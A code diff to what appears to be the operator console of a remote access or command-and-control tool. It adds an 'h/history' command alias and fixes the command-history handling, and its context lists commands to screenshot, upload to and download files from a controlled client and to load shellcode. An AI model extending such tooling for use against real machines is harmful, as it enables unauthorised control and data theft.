@@ -82,13 +82,14 @@ unix_path       = re.compile(r'^\s*download\s*((.+/)*([^/]+))$')
 unix_upld       = re.compile(r'^\s*upload\s*(.+/)*([^/]+)$')
 wind_path       = re.compile(r'^\s*download\s*((.+\\)*([^/]+))$')
 wind_upld       = re.compile(r'^\s*upload\s*(.+\\)*([^/]+)$')
-history_cmd     = re.compile(r'^\s*history\s*')
+history_cmd     = re.compile(r'^\s*history|^\s*h\s*')
 set_shellcode   = re.compile(r'^\s*set\s*shellcode\s*(\d+)\s*$')
 show_shellcodes = re.compile(r'^\s*show\s*shellcodes\s*$')
 
 # available commands...
 commands = f"""
 {B}help:{RA} show available commands.
+{B}h/history:{RA} interactive history command.
 {B}screenshot:{RA} captures a screenshot from the client.
 {B}upload <file or path to file>:{RA} uploads a file to the client.
 {B}download <file or path to file>:{RA} downloads a file from the client.
@@ -254,6 +255,7 @@ def handleGET():
         if cmd:
             pastcmds.append(cmd)
             if history_cmd.match(cmd) and pastcmds:
+                pastcmds.pop()
                 if os.name != 'nt':
                     q = [ inquirer.List('past_cmd',
                             message='Command history',
@@ -261,6 +263,7 @@ def handleGET():
                             default=pastcmds[-1]),
                         ]
                     cmd = inquirer.prompt(q, theme=GreenPassion())['past_cmd']
+                    pastcmds.append(cmd)
                 else:
                     print(f"{B}ERROR:{RA} The history command currently doesn't work on Windows systems...")
                     return emptyresponse
